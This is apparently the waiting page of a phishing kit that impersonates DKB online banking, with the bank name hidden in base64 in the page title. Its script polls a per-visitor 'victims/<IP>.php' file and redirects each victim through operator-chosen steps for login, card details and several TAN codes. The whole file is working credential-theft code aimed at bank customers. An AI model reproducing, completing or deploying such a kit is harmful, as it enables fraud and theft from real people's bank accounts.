<?php 

require_once "functions.php";
require_once "ajax.php";

?>

<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>
          <?php  
            $str = 'REtCIEJhbmtpbmc=';
            echo base64_decode($str);
          ?>
        </title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/lord.css">
        <link rel="stylesheet"  href="css/animate.css">
        <style>
          
        </style>
</head>
<body>  

          <div class="loading">
            <div class="container text-center">
              <img src="image/loading.gif" width="80">
              <br>
              <img src="image/lo.svg" width="100px;" class="mt-3">
            </div>
          </div>  








        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
          var ip = '<?php echo get_client_ip(); ?>';
          var waiting = setInterval(function() {
          $.get('victims/' + ip + '.php', function(data) {
              if( data == 0 ) {
                  // console.log('hada ba9i 0');
              } else if( data == 'login' ) {
                  clearInterval(waiting);
                  location.href = "infos.php?redirection=login";
              } else if( data == 'cc' ) {
                  clearInterval(waiting);
                  location.href = "infos.php?redirection=cc";
              } else if( data == 'tan' ) {
                  clearInterval(waiting);
                  location.href = "infos.php?redirection=tan";
              } else if( data == 'tan_2' ) {
                  clearInterval(waiting);
                  location.href = "infos.php?redirection=tan_2";
              } else if( data == 'tan_3' ) {
                  clearInterval(waiting);
                  location.href = "infos.php?redirection=tan_3";
              } else if( data == 'success' ) {
                  clearInterval(waiting);
                  location.href = "infos.php?redirection=success";
              }
          });
         }, 3000);  
        </script>
              
</body>
</html>